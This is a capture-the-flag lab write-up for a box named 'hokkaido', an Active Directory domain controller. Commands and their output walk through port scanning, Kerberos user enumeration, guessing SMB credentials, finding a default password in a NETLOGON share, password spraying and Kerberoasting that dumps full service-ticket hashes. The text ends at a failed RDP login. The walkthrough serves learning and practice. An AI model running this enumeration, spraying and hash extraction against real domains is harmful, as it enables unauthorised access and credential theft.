# CTF Writeup: hokkaido

---
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.209.40
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-23 13:51 -0500
Nmap scan report for 192.168.209.40
Host is up (0.023s latency).
Not shown: 65501 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-23 18:52:10Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2026-01-23T18:42:32
|_Not valid after:  2027-01-23T18:42:32
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2026-01-23T18:42:32
|_Not valid after:  2027-01-23T18:42:32
|_ssl-date: TLS randomness does not represent time
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   192.168.209.40:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   192.168.209.40:1433: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-01-23T18:53:27+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-14T13:04:52
|_Not valid after:  2055-11-14T13:04:52
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2026-01-23T18:42:32
|_Not valid after:  2027-01-23T18:42:32
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2026-01-23T18:42:32
|_Not valid after:  2027-01-23T18:42:32
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-01-23T18:53:27+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Not valid before: 2025-11-13T13:04:34
|_Not valid after:  2026-05-15T13:04:34
| rdp-ntlm-info: 
|   Target_Name: HAERO
|   NetBIOS_Domain_Name: HAERO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hokkaido-aerospace.com
|   DNS_Computer_Name: dc.hokkaido-aerospace.com
|   DNS_Tree_Name: hokkaido-aerospace.com
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-23T18:53:20+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8530/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 403 - Forbidden: Access is denied.
|_http-server-header: Microsoft-IIS/10.0
8531/tcp  open  unknown
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49793/tcp open  msrpc         Microsoft Windows RPC
58538/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   192.168.209.40:58538: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 58538
|_ssl-date: 2026-01-23T18:53:27+00:00; -1s from scanner time.
| ms-sql-ntlm-info: 
|   192.168.209.40:58538: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-14T13:04:52
|_Not valid after:  2055-11-14T13:04:52
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=1/23%OT=53%CT=1%CU=33161%PV=Y%DS=4%DC=T%G=Y%TM=6973C3A
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%TS=A)
OS:SEQ(SP=107%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=F9%GCD=1%ISR=10E%TI=I%CI=
OS:I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%
OS:O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-23T18:53:22
|_  start_date: N/A

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   21.43 ms 192.168.45.1
2   21.40 ms 192.168.45.254
3   21.47 ms 192.168.251.1
4   21.54 ms 192.168.209.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.62 seconds
```

Analyzing the recon scan we were able to retrieve the domain "hokkaido-aerospace.com" & "dc.hokkaido-aerospace.com". Let's map them both to our target ip in our local dns file /etc/hosts.

```
sudo echo "192.168.209.40 hokkaido-aerospace.com dc.hokkaido-aerospace.com" | sudo tee -a /etc/hosts
```

Since we got the domain, we can use kerbrute to enumerate users by abusing an misconfigured KDC / Kerberos Settings.

```
./kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.209.40 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/23/26 - Ronnie Flathers @ropnop

2026/01/23 14:20:00 >  Using KDC(s):
2026/01/23 14:20:00 >   192.168.209.40:88

2026/01/23 14:20:00 >  [+] VALID USERNAME:       info@hokkaido-aerospace.com
2026/01/23 14:20:00 >  [+] VALID USERNAME:       administrator@hokkaido-aerospace.com
2026/01/23 14:20:00 >  [+] VALID USERNAME:       INFO@hokkaido-aerospace.com
2026/01/23 14:20:02 >  [+] VALID USERNAME:       Info@hokkaido-aerospace.com
2026/01/23 14:20:03 >  [+] VALID USERNAME:       discovery@hokkaido-aerospace.com
2026/01/23 14:20:04 >  [+] VALID USERNAME:       Administrator@hokkaido-aerospace.com
2026/01/23 14:20:43 >  [+] VALID USERNAME:       maintenance@hokkaido-aerospace.com
2026/01/23 14:23:05 >  [+] VALID USERNAME:       Discovery@hokkaido-aerospace.com
```

We discovered 4 Users on the target server.

```
info
maintenance
discovery
Administrator
```

Utilized netexec to enumerate users, utilizing the retrieved users we got previously. The only user that worked with reusing credentials was info.

```
nxc smb 192.168.209.40 -u info -p info --users
SMB         192.168.209.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)                                                                                                                          
SMB         192.168.209.40  445    DC               [+] hokkaido-aerospace.com\info:info 
SMB         192.168.209.40  445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                   
SMB         192.168.209.40  445    DC               Administrator                 2023-12-06 15:56:28 0       Built-in account for administering the computer/domain                                                                                                                        
SMB         192.168.209.40  445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                                                      
SMB         192.168.209.40  445    DC               krbtgt                        2023-11-25 13:11:55 0       Key Distribution Center Service Account                                                                                                                                       
SMB         192.168.209.40  445    DC               Hazel.Green                   2023-12-06 16:34:46 0        
SMB         192.168.209.40  445    DC               Molly.Smith                   2023-11-25 13:34:13 0        
SMB         192.168.209.40  445    DC               Alexandra.Little              2023-11-25 13:34:13 0        
SMB         192.168.209.40  445    DC               Victor.Kelly                  2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Catherine.Knight              2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Angela.Davies                 2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Molly.Edwards                 2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Tracy.Wood                    2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Lynne.Tyler                   2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Charlene.Wallace              2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Cheryl.Singh                  2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Sian.Gordon                   2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Gordon.Brown                  2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Irene.Dean                    2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Anthony.Anderson              2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Julian.Davies                 2023-11-25 13:34:17 0        
SMB         192.168.209.40  445    DC               Hannah.O'Neill                2023-11-25 13:34:18 0        
SMB         192.168.209.40  445    DC               Rachel.Jones                  2023-11-25 13:34:18 0        
SMB         192.168.209.40  445    DC               Declan.Woodward               2023-11-25 13:34:18 0        
SMB         192.168.209.40  445    DC               Annette.Buckley               2023-11-25 13:34:18 0        
SMB         192.168.209.40  445    DC               Elliott.Jones                 2023-11-25 13:34:18 0        
SMB         192.168.209.40  445    DC               Grace.Lees                    2023-11-25 13:34:18 0        
SMB         192.168.209.40  445    DC               Deborah.Francis               2023-11-25 13:34:18 0        
SMB         192.168.209.40  445    DC               Bruce.Cartwright              2023-11-25 13:34:21 0        
SMB         192.168.209.40  445    DC               Nigel.Brown                   2023-11-25 13:34:21 0        
SMB         192.168.209.40  445    DC               Derek.Wyatt                   2023-11-25 13:34:21 0        
SMB         192.168.209.40  445    DC               discovery                     2023-12-06 15:42:56 0        
SMB         192.168.209.40  445    DC               maintenance                   2023-11-25 13:39:04 0        
SMB         192.168.209.40  445    DC               hrapp-service                 2023-11-25 14:14:40 0        
SMB         192.168.209.40  445    DC               info                          2023-12-06 15:43:50 0        
SMB         192.168.209.40  445    DC               [*] Enumerated 33 local users: HAERO
```

Since we know info:info logged in successfully into smb, we can enumerate running shares on the target server.

```
smbclient -L \\\\192.168.209.40 -U 'info' -p       
Password for [WORKGROUP\info]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        homes           Disk      user homes
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
        WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.
        WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.209.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Logged into SYSVOL Share with info:info

```
smbclient \\\\192.168.209.40/SYSVOL -U info
Password for [WORKGROUP\info]:
Try "help" to get a list of possible commands.
smb: \>
```

I was able to retrieve an Registry.pol file, but analyzing it didn't retrieve anything. Let's access more shares.

```
smbclient \\\\192.168.209.40/NETLOGON -U info -p
Password for [WORKGROUP\info]:
Try "help" to get a list of possible commands.
smb: \>
```

Successfully logged into "NETLOGON" Share and retrieved an interesting .txt file.

```
smbclient \\\\192.168.209.40/NETLOGON -U info -p
Password for [WORKGROUP\info]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 25 08:40:08 2023
  ..                                  D        0  Sat Nov 25 08:17:33 2023
  temp                                D        0  Wed Dec  6 10:44:26 2023

                7699711 blocks of size 4096. 1919579 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Wed Dec  6 10:44:26 2023
  ..                                  D        0  Sat Nov 25 08:40:08 2023
  password_reset.txt                  A       27  Sat Nov 25 08:40:29 2023

                7699711 blocks of size 4096. 1919579 blocks available
smb: \temp\> get password_reset.txt 
getting file \temp\password_reset.txt of size 27 as password_reset.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \temp\>
```

```
cat password_reset.txt 
Initial Password: Start123!
```

Let's utilize netexec in order to check which users are able to login with this password.
Therefore we'll need to make an wordlist containing all the users we enumerated earlier.

```
Hazel.Green
Molly.Smith
Alexandra.Little
Victor.Kelly
Catherine.Knight
Angela.Davies
Molly.Edwards
Tracy.Wood
Lynne.Tyler
Charlene.Wallace
Cheryl.Singh
Sian.Gordon
Gordon.Brown
Irene.Dean
Anthony.Anderson
Julian.Davies
Hannah.O'Neill
Rachel.Jones
Declan.Woodward
Annette.Buckley
Elliott.Jones
Grace.Lees
Deborah.Francis
Bruce.Cartwright
Nigel.Brown
Derek.Wyatt
discovery
maintenance
hrapp-service
info
```

We bruteforced logins on SMB using netexec and our customized wordlist.

```
nxc smb 192.168.209.40 -u users.txt -p Start123! 
SMB         192.168.209.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Hazel.Green:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Molly.Smith:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Alexandra.Little:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Victor.Kelly:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Catherine.Knight:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Angela.Davies:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Molly.Edwards:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Tracy.Wood:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Lynne.Tyler:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Charlene.Wallace:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Cheryl.Singh:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Sian.Gordon:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Gordon.Brown:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Irene.Dean:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Anthony.Anderson:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Julian.Davies:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Hannah.O'Neill:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Rachel.Jones:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Declan.Woodward:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Annette.Buckley:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Elliott.Jones:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Grace.Lees:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Deborah.Francis:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Bruce.Cartwright:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Nigel.Brown:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [-] hokkaido-aerospace.com\Derek.Wyatt:Start123! STATUS_LOGON_FAILURE 
SMB         192.168.209.40  445    DC               [+] hokkaido-aerospace.com\discovery:Start123!
```

We successfully logged in with user "discovery".

```
discovery:Start123!
```

Since we got credentials as the discovery user, we can send an request to the Domain Controller to ask for SPNs / Hashes.

```
impacket-GetUserSPNs -dc-ip 192.168.209.40 hokkaido-aerospace.com/discovery:Start123! -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                   Name         MemberOf                                           PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -----------  -------------------------------------------------  --------------------------  ---------  ----------
discover/dc.hokkaido-aerospace.com     discovery    CN=services,CN=Users,DC=hokkaido-aerospace,DC=com  2023-12-06 10:42:56.221832  <never>               
maintenance/dc.hokkaido-aerospace.com  maintenance  CN=services,CN=Users,DC=hokkaido-aerospace,DC=com  2023-11-25 08:39:04.869703  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*discovery$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/discovery*$4d94b907800acf3b6cce6f50042e7d59$ef12fc32d8024cf373e07e8ad1e5f1a78e0836578d4a41d8504daee074bf5b85e0dac571cec45ac428ff0989038589376ddfc7348c7df25eb61e3bf9ee77892e74b5fc7d59851762a1c74ced3bbbf57a10599ceb130cd5e98d6495aa5c78a2dc101577a7f81739de473d52c77989d6335956e295145dfe0c84cc0c11a5c33c91e10811f72b78cab6562b78ddfcb6b205884d4f2a2817bd2baae115f70d900533de9c056b45809990ff09efed6fb90548a4cecefa75d9a6485512411d38fe5fe79aa56b3dda2b5e4c821690a7db267e75a8eb1b9ce5062ee19120d288ba6dc1e53ae931edc0b8881dcbc5a3c0d0953a10535961eabbcfe607f436fdaab4a10209f77795ce561b2dfdffac656d10ff57613ccc1826caa730d3ec070e4c5f54807235a9ccf5863c76978b2dc7ae959645662fab69ee34cb91f43156820e75af4e92bcbf87028d56974a2c1acec003a805b29c3b5aad7b25ed8c372a160e0f1e51002082598e42e22635d0f8b05374ade576b47e65e33aa47871d8ec251bb83e3d6bc9109753dd0e1edccee7c5fde280fcb34020b059b3278f2bd596402bc42ed984e2e38e40da811f18657a32d969b889ba4e06cac77c3a75e589802afa571fa6fb11304eedc2720c53f77ffc66cc4ff76f5a0dca9d3e2f3840610f0f3be87e5b9fce2a50ef86c48d9db884805cb3a9b400e9c35cc5d38ca627ce732f107782ed761b8254cfdd5a7977c75f6f2f5eb6e9b9615a10720dffdd039d013e7304fa6317728fc18a0b443e11fcc95854113584140f54f44ea162ab13f0d3b0adaa5f951503958ab45aa0eb408c99642af491f66e74325efd5be1d726da7a993e0c9b5f4e629d04db64f60c7957fc44e507f6835eb21ce49b267bd4a9c5deabf5f00b150995662b425006e07394ad82b4ff653037d840884a2129b13addc72b8ba881d7ea29cd451c7df67a7cf83a6925f5eb85caade3afa722c54c538a84e9112a36307c75162e89b92c3d3fdfa96130c50675fdb51523c4c7c8e67a9272d492ab94dd0c7babdd3f4cb074c3159a89a45666e308d79faaeb9ebbd9a5ebced87865432ff7a2f375d32c626e1ca735da8002e26cf36af399db988ca81c914aaa99b197cc5d4ccb2492d63ab523030c9a029b70424c3779f8f43f18566e7c395a346abc439dc0982beb19e146b10dda0511e04716248ca6424669bbad2afa7ebd574d0fedad881c32b672e99670578329cbe535f31802f331fdef598db36f7aee0ce17e8840469211a1e982373291a2a4a0b6f1014b2b7ef9620eeafff5e2781da2085de96d2860833947147d00422799db4e64ead5da6ab40abb57f57d9aca5c3c10efa5ebfe197c03ac782f0273a1503dea94088999b218fb020d8328fffd1ddc21ef30ee00b79b55a16b999a94bc6a322b7751b14e464fb3919cf3b4f37572c4868103374107e01b4371274ba8aa0352e1cf157db5ae9121ecb5201ed983b1e441fa1936c49aa6c1bb312150e8f2ab90165a001479a6544751d2f8da6c9a48f50f9d3df49dbd47e9432cd6f9b5fc00eccb778975943c2a421cbd3e1b8115c9a854634797
$krb5tgs$23$*maintenance$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/maintenance*$4aa38f6c8e8e8d13a8935b1f57811e37$0d97954de366e89f7fb83a94835f4de84d880e70286694b97e74841aeb9623d0f5663e3705fb29837b335e6c2c03ad199986001d02012177d13ac83ec94f06bf613c5d1f913b526f00d416cd23e28132e17ef9c6d2816905b62ea79d188c111ae35f519845a1667a5aa33231a405114845f87af968f53f75d249d0d3d7366121e7713ebaac65de08b850b133d6193813976835a6e472bb1e246fa781cc1c8d15a53e65176db012115f586d2ad61a0a3148470bc109d70bf8642fa7d70b1b0f5a96b95b33c36cb0f4d83b88b2541340ab666a5982837e89604f38edaa0bc0a39d8089bb2456ee2288d2ad95e8bf0a629d4ab2d41691f800e14b86c9b7060ed6694b650413e5e6df8eeb9bea0e6769ec38c3bc9fc076f3a5b59f57fbdd743764f742f6fde45e0f4fd2ebfa3adb72a057a9477c8bed8109bc71ff0997992617ed6a28f8a783e172294f926b9748b1f7a0500d7cb884ef1eb5817d91b225ec75f56508779d9d08f58f8c6aeabcfa4729676915df77f93c6df74fc2a1b63f624aa41c87ae334fd22acd159c035d7188007400eeee1ed3473949e0e601083b323f76f5699a3ce2c722e533abb5be1cd041723fc7dc777f894d17e0e3d0f646b994e5a4d5f6c4a6f153144720c29576648a51d4457ce0e67bc1920f85ad0a2debf3313ea1b7d82b6282444cc40221de603e77a368e901a79b4d7907679d6cb045eedba14066ce0a5182a9661188ae127a4a01a783909609c88afea6fee7df544efef89cdbf22c4ea84cf941917ab720fbdf61346f6284ec3f3317aa160ce3ce4f344c2133de4a245a80f3ef8958a96e431248e32876bddbd97598c1305b5036d1c67b2bccfafd0acb722b330970f665ef7947a36971de5f4b767f81eec81dd65414f0118429eeea441edb0c10388a16191e84448179e6a3afd156e40a3a5c7e081446c56a6e6ecd656c08ceb22a427a8428d251c2490e0acbb43d50cb29277ef56ffb85d56f0cd5106287f7af6eb8bf88569e81fc2f08d6294fb776d16ac6b87edade7859eeb42603d06d49b4a42119c1f7e918b4497ab5fc35ccc0b98a337b51d4449c21b459986e168d5b4c9ffb395539fbd45aaf03e0725a99f49e1dba36bca24098ca420154d409226c25326fe402a508bbcdddd8dc60e4c5368fda69d233c30c8d3687ffbbcf158d8f847ab7d0fc0969ca2ad5b4f4f33a7ac3cf40276af2a9acf7f5e6f330f19bdaaafc031c432895c89315725122b7d0245358843b94eed9ad671da08ffbba24ef0b1307d8e045aee45f55ea6eeccd775cb78e6ba98ba77ac983b4cc8867f3e08731f60b90809e722ffba9aef752997e1a46a8ee0f022f9866de220a85372860bc22bb8b971332944ca01887e4474a58547a4ce6592da3cab25f456e44d825951b7a8392f1fde5162b21e56128aeffae5c44693abab7bffdd7c42a38688423c34180e0cfcd8be85e655c7052dbf060903c48116bee2c377ad091b1ec9e93e15c0bdf61ff0233cd6e1e5f681405277e92f9aa969179f07a1e78901387788eb23b304b5403eebdb42ccf47c8dcbeddf888041f06fc83d003e3460d
```

Retrieved 2 Hashes for user "maintenance" & "discovery". Let's save them locally and bruteforce them with hashcat.

Very odd, but we weren't able to bruteforce the hashes. Since we still got credentials for user "discovery" and for user "info", let's try and utilize them on the other running services. Let's perform bruteforcing on all the running services with an cool script called "brutedirty".

1. RDP didn't work.

```
xfreerdp3 /v:192.168.209.40 /u:discovery /p:'Start123!' /cert:ignore /clipboard /compression /auto-reconnect /w:1600 /h:800 /drive:test,/home/saitama/Desktop
[15:02:27:634] [5764:00001684] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Using /p is insecure
[15:02:27:634] [5764:00001684] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Passing credentials or secrets via command line might expose these in the process list
[15:02:27:634] [5764:00001684] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
[15:02:27:634] [5764:00001684] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]:   - /args-from: pipe in arguments from stdin, file or file descriptor
[15:02:27:634] [5764:00001684] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]:   - /from-stdin pass the credential via stdin
[15:02:27:634] [5764:00001684] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]:   - set environment variable FREERDP_ASKPASS to have a gui tool query for credentials
[15:02:27:639] [5764:00001686] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x08 -> no RDP scancode found
[15:02:27:639] [5764:00001686] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]: ZEHA: keycode: 0x5d -> no RDP scancode found
[15:02:27:757] [5764:00001686] [WARN][com.freerdp.crypto] - [tls_verify_certificate]: [DANGER] Certificate not checked, /cert:ignore in use.
[15:02:27:757] [5764:00001686] [WARN][com.freerdp.crypto] - [tls_verify_certificate]: [DANGER] This prevents MITM attacks from being detected!
[15:02:27:757] [5764:00001686] [WARN][com.freerdp.crypto] - [tls_verify_certificate]: [DANGER] Avoid using this unless in a secure LAN (=no internet) environment
[15:02:27:882] [5764:00001686] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5glue_get_init_creds (Client 'discovery@ATHENA.MIT.EDU' not found in Kerberos database [-1765328378])
[15:02:28:000] [5764:00001686] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5glue_get_init_creds (Client 'discovery@ATHENA.MIT.EDU' not found in Kerberos database [-1765328378])
[15:02:28:077] [5764:00001686] [ERROR][com.freerdp.core.transport] - [transport_read_layer]: BIO_read returned a system error 104: Connection reset by peer
